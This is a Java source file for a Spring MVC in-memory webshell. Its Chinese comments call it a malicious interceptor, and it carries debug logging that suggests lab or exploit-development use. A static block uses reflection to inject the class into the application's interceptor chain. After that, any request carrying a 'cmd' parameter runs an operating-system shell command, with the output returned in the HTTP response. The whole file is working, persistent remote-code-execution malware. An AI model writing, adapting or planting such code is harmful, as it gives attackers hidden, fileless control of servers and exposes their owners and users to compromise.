package demo;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

/**
 * 恶意拦截器 - Spring内存马
 * 通过Evil类动态加载后，在静态代码块中注入到Spring MVC拦截器链
 * 访问任意URL时，如果带有cmd参数就会执行命令
 */
public class calc implements HandlerInterceptor {
    
    static {
        System.out.println("[calc] 静态代码块开始执行");
        try {
            System.out.println("[calc] 尝试获取Spring上下文...");
            
            // 尝试获取RequestContextHolder
            try {
                System.out.println("[calc] 尝试获取RequestContextHolder...");
                Object requestAttributes = RequestContextHolder.currentRequestAttributes();
                System.out.println("[calc] RequestContextHolder获取成功: " + requestAttributes);
            } catch (Exception e) {
                System.err.println("[calc] RequestContextHolder获取失败: " + e.getClass().getName() + " - " + e.getMessage());
                e.printStackTrace();
            }
            
            // 尝试多种方式获取Spring上下文
            WebApplicationContext context = null;
            
            // 方法1: 尝试不同的属性名称
            try {
                System.out.println("[calc] 方法1: 尝试属性 'org.springframework.web.servlet.DispatcherServlet.CONTEXT'");
                context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                        .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
                if (context != null) {
                    System.out.println("[calc] 方法1成功: " + context);
                } else {
                    System.out.println("[calc] 方法1失败: 属性值为null");
                }
            } catch (Exception e) {
                System.err.println("[calc] 方法1异常: " + e.getClass().getName() + " - " + e.getMessage());
            }
            
            // 方法2: 尝试其他可能的属性名称
            if (context == null) {
                try {
                    System.out.println("[calc] 方法2: 尝试属性 'org.springframework.web.servlet.DispatcherServlet.CONTEXT' (1)");
                    context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                            .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 1);
                    if (context != null) {
                        System.out.println("[calc] 方法2成功: " + context);
                    } else {
                        System.out.println("[calc] 方法2失败: 属性值为null");
                    }
                } catch (Exception e) {
                    System.err.println("[calc] 方法2异常: " + e.getClass().getName() + " - " + e.getMessage());
                }
            }
            
            // 方法3: 尝试获取ServletContext
            if (context == null) {
                try {
                    System.out.println("[calc] 方法3: 尝试通过ServletContext获取");
                    javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
                    javax.servlet.ServletContext servletContext = request.getServletContext();
                    System.out.println("[calc] ServletContext获取成功: " + servletContext);
                    
                    // 尝试从ServletContext获取Spring上下文
                    try {
                        context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(servletContext);
                        if (context != null) {
                            System.out.println("[calc] 方法3成功: " + context);
                        } else {
                            System.out.println("[calc] 方法3失败: WebApplicationContextUtils返回null");
                        }
                    } catch (Exception e) {
                        System.err.println("[calc] WebApplicationContextUtils异常: " + e.getClass().getName() + " - " + e.getMessage());
                    }
                } catch (Exception e) {
                    System.err.println("[calc] 方法3异常: " + e.getClass().getName() + " - " + e.getMessage());
                }
            }
            
            // 如果获取到上下文，尝试注入
            if (context != null) {
                System.out.println("[calc] 成功获取Spring上下文，开始注入...");
                
                try {
                    // 获取RequestMappingHandlerMapping - 明确指定bean名称
                    RequestMappingHandlerMapping mappingHandlerMapping = context.getBean("requestMappingHandlerMapping", RequestMappingHandlerMapping.class);
                    System.out.println("[calc] 获取RequestMappingHandlerMapping成功");
                    
                    // 通过反射获取adaptedInterceptors字段
                    Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                    field.setAccessible(true);
                    System.out.println("[calc] 获取adaptedInterceptors字段成功");
                    
                    // 获取拦截器列表
                    List<HandlerInterceptor> adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
                    System.out.println("[calc] 获取拦截器列表成功，当前数量: " + adaptInterceptors.size());
                    
                    // 注入恶意拦截器
                    calc evilInterceptor = new calc();
                    adaptInterceptors.add(evilInterceptor);
                    
                    System.out.println("[calc] 恶意拦截器注入成功！当前拦截器数量: " + adaptInterceptors.size());
                } catch (Exception e) {
                    System.err.println("[calc] 注入过程中发生异常: " + e.getClass().getName() + " - " + e.getMessage());
                    e.printStackTrace();
                }
            } else {
                System.out.println("[calc] 所有方法都无法获取Spring上下文，注入失败");
            }
        } catch (Exception e) {
            System.err.println("[calc] 静态代码块执行过程中发生异常: " + e.getClass().getName() + " - " + e.getMessage());
            System.err.println("[calc] 异常详细信息:");
            e.printStackTrace();
        }
        System.out.println("[calc] 静态代码块执行完成");
    }
    
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[calc] preHandle被调用，URL: " + request.getRequestURI());
        System.out.println("[calc] 请求方法: " + request.getMethod());
        System.out.println("[calc] 请求参数: " + request.getQueryString());
        
        // 检查是否有cmd参数
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                System.out.println("[calc] 执行命令: " + cmd);
                
                // 判断操作系统类型
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                
                System.out.println("[calc] 操作系统: " + osType + ", isLinux: " + isLinux);
                
                // 构建命令数组
                String[] cmds = isLinux ? 
                    new String[]{"sh", "-c", cmd} : 
                    new String[]{"cmd.exe", "/c", cmd};
                
                System.out.println("[calc] 执行命令数组: " + java.util.Arrays.toString(cmds));
                
                // 执行命令
                Process process = Runtime.getRuntime().exec(cmds);
                InputStream in = process.getInputStream();
                InputStream err = process.getErrorStream();
                
                Scanner s = new Scanner(in).useDelimiter("\\A");
                Scanner errScanner = new Scanner(err).useDelimiter("\\A");
                
                String output = s.hasNext() ? s.next() : "";
                String errorOutput = errScanner.hasNext() ? errScanner.next() : "";
                
                System.out.println("[calc] 命令输出: " + output);
                if (!errorOutput.isEmpty()) {
                    System.out.println("[calc] 命令错误输出: " + errorOutput);
                }
                
                // 等待命令执行完成
                int exitCode = process.waitFor();
                System.out.println("[calc] 命令执行完成，退出码: " + exitCode);
                
                // 输出结果
                response.getWriter().write("Command: " + cmd + "\n");
                response.getWriter().write("Exit Code: " + exitCode + "\n");
                response.getWriter().write("Output:\n" + output + "\n");
                if (!errorOutput.isEmpty()) {
                    response.getWriter().write("Error:\n" + errorOutput + "\n");
                }
                response.getWriter().flush();
                response.getWriter().close();
                
                System.out.println("[calc] 命令执行完成");
            } catch (Exception e) {
                System.err.println("[calc] 命令执行失败: " + e.getMessage());
                e.printStackTrace();
                
                // 输出详细错误信息到响应
                response.getWriter().write("Command execution failed: " + e.getMessage() + "\n");
                response.getWriter().write("Exception type: " + e.getClass().getName() + "\n");
                response.getWriter().flush();
                response.getWriter().close();
            }
            return false; // 阻止继续处理
        }
        return true; // 继续正常处理
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        System.out.println("[calc] postHandle被调用");
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("[calc] afterCompletion被调用");
        if (ex != null) {
            System.out.println("[calc] 异常信息: " + ex.getMessage());
        }
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
